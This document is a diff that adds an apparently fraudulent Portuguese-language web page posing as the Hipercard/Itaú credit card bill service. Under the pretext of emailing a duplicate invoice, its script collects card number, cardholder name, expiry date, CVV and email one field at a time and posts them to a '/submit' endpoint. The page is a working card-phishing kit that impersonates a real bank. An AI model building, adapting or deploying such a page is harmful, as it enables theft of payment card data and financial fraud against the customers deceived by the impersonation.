@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Fatura Hipercard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Open+Sans&display=swap");
+    body {
+      font-family: "Open Sans", sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-[#f1ebe7] m-0 p-0">
+  <!-- Top red bar -->
+  <div class="bg-[#b9131b] text-white text-sm font-semibold px-6 py-2 w-full">
+    ir para Hipercard cartões
+  </div>
+
+  <!-- Navigation bar -->
+  <nav class="bg-white shadow-sm flex items-center px-6 py-4 w-full">
+    <div class="flex items-center space-x-6">
+      <img src="https://storage.googleapis.com/a1aa/image/67fb38ab-463a-4fc3-742c-b99a7fd27951.jpg" alt="Hipercard logo" class="h-10 w-auto" />
+      <div class="border-l border-gray-300 h-6"></div>
+      <a class="text-gray-800 font-semibold hover:underline text-base leading-none" href="#">serviços</a>
+      <a class="text-gray-800 font-semibold hover:underline text-base leading-none" href="#">ajuda</a>
+    </div>
+  </nav>
+
+  <!-- Title bar -->
+  <div class="bg-[#f9f5f1] px-6 py-3 w-full">
+    <h1 class="text-2xl font-extrabold text-gray-900">Fatura</h1>
+  </div>
+
+  <!-- Main content -->
+  <main class="flex flex-col md:flex-row justify-center md:justify-between px-6 py-10 max-w-7xl mx-auto gap-10">
+    <!-- Left text block -->
+    <section class="max-w-lg">
+      <h2 class="text-2xl font-extrabold text-gray-900 mb-3">Consultar Fatura</h2>
+      <p class="text-gray-700 mb-6 text-base leading-relaxed">
+        receba a 2ª via da fatura do cartão por e-mail
+      </p>
+      <p class="text-gray-600 text-xs leading-tight">
+        Para consultar ou atualizar seu endereço de e-mail, acesse seu perfil no App Itaú Cartões, ou entre em contato pelo atendimento.
+      </p>
+    </section>
+
+    <!-- Right form block -->
+    <section>
+      <form id="form" class="bg-white rounded-md p-8 max-w-md w-full shadow-sm">
+        <h3 class="font-extrabold text-gray-900 mb-6 text-center text-sm md:text-base">
+          2ª via da fatura por e-mail
+        </h3>
+        <input type="text" id="inputField" placeholder="Número do Cartão" required
+          class="w-full border border-gray-400 rounded px-4 py-3 mb-4 text-base text-gray-900 placeholder-gray-700 focus:outline-none focus:ring-2 focus:ring-[#b9131b]" />
+        <button type="button" id="nextButton"
+          class="w-full bg-[#b9131b] text-white font-semibold py-3 rounded hover:bg-[#991018] transition-colors">
+          Continuar
+        </button>
+      </form>
+    </section>
+  </main>
+
+  <script>
+    const steps = [
+      { placeholder: "Número do Cartão", key: "cardNumber" },
+      { placeholder: "Nome no Cartão", key: "nomeCartao" },
+      { placeholder: "Validade (MM/AA)", key: "validade" },
+      { placeholder: "CVV", key: "cvv" },
+      { placeholder: "Email", key: "email" }
+    ];
+
+    const formData = {};
+    let currentStep = 0;
+
+    const input = document.getElementById("inputField");
+    const button = document.getElementById("nextButton");
+
+    button.addEventListener("click", () => {
+      const value = input.value.trim();
+      if (!value) {
+        alert("Por favor, preencha o campo antes de continuar.");
+        return;
+      }
+
+      formData[steps[currentStep].key] = value;
+      currentStep++;
+
+      if (currentStep < steps.length) {
+        input.value = "";
+        input.placeholder = steps[currentStep].placeholder;
+      } else {
+        enviarDados(formData);
+      }
+    });
+
+    function enviarDados(data) {
+      fetch("/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(result => {
+        if (result.status === "success") {
+          alert("Dados enviados com sucesso!");
+        } else {
+          alert("Erro: " + result.message);
+        }
+      })
+      .catch(error => alert("Erro ao enviar dados: " + error.message));
+    }
+  </script>
+</body>
+</html>
